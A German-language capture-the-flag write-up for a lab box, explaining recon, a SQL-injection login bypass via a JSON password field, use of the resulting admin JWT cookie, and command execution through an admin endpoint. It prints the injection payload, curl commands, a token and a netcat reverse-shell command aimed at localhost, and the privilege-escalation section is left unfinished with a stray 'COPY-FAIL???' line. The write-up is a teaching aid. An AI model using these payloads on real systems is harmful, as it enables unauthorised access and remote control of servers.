# Writeup – PwnBox (SQL-Injection → Admin → Command Execution)



## Ziel & Überblick
In dieser Box lernst du typische Schritte aus einem Web-Security-Workflow kennen:

- **Discovery/Recon:** Herausfinden, welche Dienste laufen und welche URLs es gibt.
- **Request-Analyse:** Verstehen, wie der Login technisch funktioniert (welcher API-Endpunkt, welches Datenformat).
- **Schwachstelle:** Eine **SQL Injection** im Login erlaubt das Umgehen der Authentifizierung.
- **Impact:** Nach dem Login erhältst du einen Token (Cookie), der Adminrechte repräsentiert.
- **Folgefehler:** Ein Admin-Endpunkt führt Server-Befehle aus → **Remote Code Execution (RCE)**.

> Kurz: **Unsichere Datenbank-Abfrage** → **Admin** → **Befehlsausführung**.

## Begriffe & Tools (einfach erklärt)
Du brauchst für so eine Analyse typischerweise vier Kategorien von Werkzeugen:

- **Portscanner** (z. B. *nmap*): Findet offene Ports/Dienste (z. B. Webserver, Datenbank).
- **Directory/Endpoint Enumeration** (z. B. *gobuster*): Probiert viele mögliche Pfade (z. B. `/login`, `/api/...`), um versteckte Seiten/APIs zu finden.
- **Intercepting Proxy** (z. B. *Burp Suite*): Sitzt zwischen Browser und Server und zeigt dir die echten HTTP-Requests/Responses.
- **HTTP-Client** (z. B. *curl*, *Postman*): Zum Nachstellen von API-Anfragen, wenn du nicht über die Website klickst.

Wichtige Grundbegriffe:

- **Authentifizierung (AuthN):** „Wer bist du?“ (Login)
- **Autorisierung (AuthZ):** „Was darfst du?“ (z. B. Adminrechte)
- **API-Endpunkt:** Eine URL, die Daten verarbeitet (oft JSON) – z. B. `/api/login`.
- **Cookie:** Daten, die der Browser für eine Domain speichert und bei Requests mitsendet.
- **JWT (JSON Web Token):** Ein Token-Format, das Claims (z. B. Benutzer-ID, Rollen) enthält und signiert ist.

## 1) Discovery: Oberfläche und API finden
### 1.1 Offene Dienste erkennen
Als Erstes möchtest du herausfinden:

- Welche Ports sind offen?
- Welche Services laufen dort (HTTP, HTTPS, …)?

Das ist wichtig, weil eine Web-App oft nicht nur „Port 80/443“ nutzt, sondern z. B. einen eigenen Port für ein Backend.

### 1.2 Verzeichnisse/Paths enumerieren
Viele Apps haben Routen, die nicht direkt verlinkt sind.
Mit einer Pfad-Enumeration findest du z. B.:

- `/login` (Login-Seite)
- `/api/...` (Backend-API [Anderer Port als Frontend])

In deiner Box war `/login` erreichbar.

## 2) Login-Flow verstehen (Burp Suite / Proxy-Analyse)
Wenn du im Browser auf „Login“ klickst, siehst du oberflächlich nur ein Formular.
Technisch passiert aber ein HTTP-Request an einen API-Endpunkt.

Mit einem Proxy wie Burp kannst du sehen:

- Welche URL wird angesprochen? (z. B. `/api/login`)
- Welche HTTP-Methode? (häufig `POST`)
- Welches Format? (hier: **JSON**)

Beispielhaft sieht so ein Login-Payload oft so aus:

```json
{
  "username": "...",
  "password": "..."
}
```

Warum ist das wichtig?

- Du kannst Requests später gezielt nachstellen.
- Du erkennst, ob der Server z. B. Fehlermeldungen verrät.

## 3) API-Endpunkte enumerieren
Nachdem klar ist, dass es eine `/api/...` gibt, ist der nächste Schritt:

- Welche Endpunkte existieren noch?

In deiner Enumeration tauchten u. a. auf:

- `/api/admin` – wirkt wie ein **Privilege-Check** („Bin ich Admin?“)
- `/api/admin/cmd` – wirkt wie ein **Admin-Feature**, das Befehle entgegennimmt

Schon hier ist ein wichtiger Lernpunkt:

- Ein Endpunkt kann existieren, auch wenn er **nicht in der UI** sichtbar ist.
- Admin-Endpunkte müssen **hart** abgesichert sein (AuthZ).

## 4) SQL Injection (SQLi) – was ist das?
### 4.1 SQL in 30 Sekunden
**SQL** ist die Sprache, mit der eine Anwendung eine Datenbank abfragt.
Beispiel: „Gib mir den Benutzer, der `username = X` hat.“

### 4.2 Was ist eine SQL Injection?
Eine **SQL Injection** entsteht, wenn eine Anwendung **Benutzereingaben ungefiltert** in einen SQL-String „zusammenklebt“.

Statt „Daten“ werden dann plötzlich auch „SQL-Befehle“ Teil der Abfrage.
Das kann z. B. dazu führen, dass:

- der Login **umgangen** wird,
- Daten ausgelesen werden,
- Daten verändert werden.

Typisches Anti-Pattern (vereinfacht, unsicher):

```js
// ❌ UNSICHER: String-Konkatenation
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```
In diesem Beispiel ist die benötigte Payload um eine SQL Injection zu testen:
```json
		{
		 "username": "admin",
		 "password": "'OR"
		 }
```

### 4.3 Warum ein Serverfehler ein Hinweis sein kann
In deinem Writeup hast du beschrieben, dass schon „unerwartete Eingaben“ beim Login zu einem **Internal Server Error** führen.

Das ist oft ein Hinweis auf:

- Eingaben landen ungeprüft in der Datenbankabfrage
- Fehlermeldungen werden nicht sauber behandelt

Wichtig: Ein Fehler ist noch kein Beweis – aber ein guter Grund, genauer hinzuschauen.

Jetzt können wir einen SQL Injection Query bauen der uns admin privs gibt:
```json
		{
		 "username": "admin",
		 "password": "'OR '1'='1"
		 }
```

### 4.4 Ergebnis in dieser PwnBox
Durch die SQLi im Login konnte die Authentifizierung so manipuliert werden, dass die Anwendung dich als (Admin‑)Benutzer akzeptiert.

Als Folge erhielt der Browser einen **Auth-Cookie** (z. B. `auth_token`), der in späteren Requests mitsendet wird.

## 5) Auth-Cookie / JWT verständlich erklärt
Viele Backends arbeiten so:

1. Du sendest Benutzername/Passwort.
2. Der Server prüft die Daten.
3. Bei Erfolg gibt der Server einen **Token** zurück.
4. Der Browser speichert den Token (häufig als Cookie).
5. Bei späteren Requests „beweist“ der Token, dass du eingeloggt bist.

Ein verbreitetes Token-Format ist **JWT**:

- Es enthält „Claims“ (z. B. Benutzer-ID, Username, Rolle/`isAdmin`).
- Es ist **signiert**, damit der Server prüfen kann: „Wurde das manipuliert?“

Lernpunkt:

- Ein JWT ist **kein Geheimnis** (Base64-kodiert ≠ verschlüsselt).
- Sicherheit kommt von der **Signaturprüfung** und davon, dass der Server **Claims nicht blind vertraut**, sondern sauber autorisiert.

## 6) Admin-Endpunkt mit Befehlsausführung (RCE)
Der Endpunkt `/api/admin/cmd` ist in deiner Box das „große Finale“.
Vom Verhalten her:

- Er nimmt einen JSON-Body mit einem „Befehl“ entgegen.
- Er führt diesen Befehl serverseitig aus.
- Er gibt `stdout`/`stderr` zurück.

Das ist ein Beispiel für **Remote Code Execution**:

- **RCE** bedeutet: Ein Angreifer kann Code/Befehle auf dem Server ausführen.
- In echten Systemen ist das eine der kritischsten Klassen von Schwachstellen.

Warum ist das so gefährlich?

- Dateien lesen (z. B. Konfigurationen/Secrets)
- Daten verändern
- Persistenz aufbauen
- Von dort aus weiter ins Netzwerk „pivoten“

## 7) Foothold & warum Reverse Shells erwähnt werden
Ein „Foothold“ ist ein erster stabiler Zugriff, mit dem du interaktiv arbeiten kannst.

Viele Angreifer versuchen nach einer RCE eine **interaktive Shell** zu bekommen.
Das Prinzip einer Reverse Shell ist dabei:

- Nicht du verbindest dich zum Server,
- sondern der Server baut eine Verbindung zu dir auf.

In Diesem Beispiel kann eine reverse shell mit der Payload:

```
curl -X POST http://localhost:7401/api/admin/cmd \
-H "Content-Type: application/json" \
-d '{"cmd": "nc 127.0.0.1 4444 -e /bin/sh"}' \
-b 'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzgxMzc0NTMsImV4cCI6MTc3ODE0MTA1M30.BlcuBnnCdnTa6tQucYaXlAnzeEUOMvf4Nm0BtqMyflw'
```

erstellt werden
## 8) Nächste Phase: Privilege Escalation & Lateral Movement (High-Level)
Du erwähnst, dass es eine „two-stage“ Box ist.
Nach dem initialen Zugriff folgen meist:

- **Privilege Escalation:** Von einem eingeschränkten Benutzer zu mehr Rechten (z. B. root).
- **Lateral Movement:** Von einem Dienst/System zu einem anderen (z. B. über Credentials).

Auf hoher Ebene schaut man dabei oft auf:

- Welche Rechte hat der aktuelle Prozess? (User/Gruppen)
- Welche Secrets liegen im Dateisystem oder in Umgebungsvariablen?
- Gibt es Fehlkonfigurationen (z. B. zu breite Datei-/Socket-Rechte)?
- Welche weiteren Dienste sind intern erreichbar?
- **COPY-FAIL???**

## 9) Alle Befehle im Überblick
- Enumeration mit gobuster: 
```
gobuster --url "http:****" --wordists /usr/share/wordlists/seclists/Discovery/Web-Content
	  DirBuster-2007_directory-list-lowercase-2.3-small.txt
```
- Payload für die SQL-Injection
```json
		{
		 "username": "admin",
		 "password": "'OR '1'='1"
		 }
```
- Curl für RCE:
```json
curl -X POST http://localhost:7401/api/admin/cmd \
		-H "Content-Type: application/json" \
		-d '{"cmd": "ls"}' \
		-b 'auth_token={token}'

```
- Curl mit reverse shell payload:
```json
	curl -X POST http://localhost:7401/api/admin/cmd \
-H "Content-Type: application/json" \
-d '{"cmd": "nc 127.0.0.1 4444 -e /bin/sh"}' \
-b 'auth_token={token}'
{"stdout":"","stderr":""}   
```